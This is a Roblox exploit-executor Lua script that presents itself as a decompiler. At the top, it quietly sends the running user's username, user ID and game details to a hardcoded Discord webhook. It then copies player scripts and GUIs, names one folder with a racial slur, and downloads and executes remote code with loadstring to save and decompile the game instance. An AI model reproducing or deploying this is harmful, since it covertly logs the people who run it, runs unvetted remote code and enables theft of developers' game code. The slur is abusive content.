local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

local WEBHOOK_URL = "https://discord.com/api/webhooks/1548663804676669507/eUL2ly-MH9eSIFj4WHfLmhZyCuaVfrZueVdMV17LBnYRNfYbmjV4s7qtqL2TQZKsUd-s"

local player = Players.LocalPlayer or Players.PlayerAdded:Wait()
local username = player.Name
local userId = tostring(player.UserId)

local placeId = tostring(game.PlaceId)
local gameName = "Unknown Game"

local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request

if request then
    local universeResponse = request({
        Url = "https://apis.roblox.com/universes/v1/places/" .. placeId .. "/universe-id",
        Method = "GET"
    })

    if universeResponse and universeResponse.StatusCode == 200 then
        local universeData = HttpService:JSONDecode(universeResponse.Body)
        local universeId = universeData.universeId

        if universeId then
            local gameResponse = request({
                Url = "https://games.roblox.com/v1/games?universeIds=" .. tostring(universeId),
                Method = "GET"
            })

            if gameResponse and gameResponse.StatusCode == 200 then
                local gameData = HttpService:JSONDecode(gameResponse.Body)
                if gameData.data and gameData.data[1] then
                    gameName = gameData.data[1].name
                end
            end
        end
    end

    local gameLink = "https://www.roblox.com/games/" .. placeId
    local profileLink = "https://www.roblox.com/users/" .. userId .. "/profile"

    local payload = {
        username = "Roblox Decompile Logger",
        embeds = {{
            title = "Decompiler Used",
            color = 0x5865F2,
            fields = {
                {
                    name = "User",
                    value = username .. "\n`" .. userId .. "`",
                    inline = false
                },
                {
                    name = "Game",
                    value = gameName,
                    inline = false
                },
                {
                    name = "Place ID",
                    value = "`" .. placeId .. "`",
                    inline = true
                },
                {
                    name = "Game Link",
                    value = "[Open Game](" .. gameLink .. ")",
                    inline = false
                },
                {
                    name = "Profile Link",
                    value = "[Open Profile](" .. profileLink .. ")",
                    inline = false
                }
            },
            footer = {
                text = "Roblox Logger"
            },
            timestamp = DateTime.now():ToIsoDate()
        }}
    }

    request({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode(payload)
    })
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local folder = ReplicatedStorage:FindFirstChild("Decompile") or Instance.new("Folder")
folder.Name = "Decompile"
folder.Parent = ReplicatedStorage

local function cloneSafe(obj, parent)
	if obj.Archivable then
		local clone = obj:Clone()
		clone.Parent = parent
	end
end

local function setupPlayer(player)
	local playerGui = player:WaitForChild("PlayerGui")
	local playerScripts = player:WaitForChild("PlayerScripts")

	local playerFolder = Instance.new("Folder")
	playerFolder.Name = "Not Getting My User Nigga"
	playerFolder.Parent = folder

	local guisFolder = Instance.new("Folder")
	guisFolder.Name = "Guis"
	guisFolder.Parent = playerFolder

	local scriptsFolder = Instance.new("Folder")
	scriptsFolder.Name = "PlayerScripts"
	scriptsFolder.Parent = playerFolder

	local charScriptsFolder = Instance.new("Folder")
	charScriptsFolder.Name = "CharacterScripts"
	charScriptsFolder.Parent = playerFolder

	for _, v in ipairs(playerGui:GetChildren()) do
		cloneSafe(v, guisFolder)
	end

	for _, v in ipairs(playerScripts:GetChildren()) do
		cloneSafe(v, scriptsFolder)
	end

	local function scanCharacter(char)
		task.wait(1)

		for _, v in ipairs(char:GetDescendants()) do
			if v:IsA("LocalScript") or v:IsA("Script") then
				cloneSafe(v, charScriptsFolder)
			end
		end
	end

	if player.Character then
		scanCharacter(player.Character)
	end

	player.CharacterAdded:Connect(scanCharacter)
end

Players.PlayerAdded:Connect(setupPlayer)

for _, player in ipairs(Players:GetPlayers()) do
	setupPlayer(player)
end

wait(1)
local Params = {
 RepoURL = "https://raw.githubusercontent.com/luau/UniversalSynSaveInstance/main/",
 SSI = "saveinstance",
}
local synsaveinstance = loadstring(game:HttpGet(Params.RepoURL .. Params.SSI .. ".luau", true), Params.SSI)()
local Options = {Decompile = true} -- Documentation here https://luau.github.io/UniversalSynSaveInstance/api/SynSaveInstance
synsaveinstance(Options)
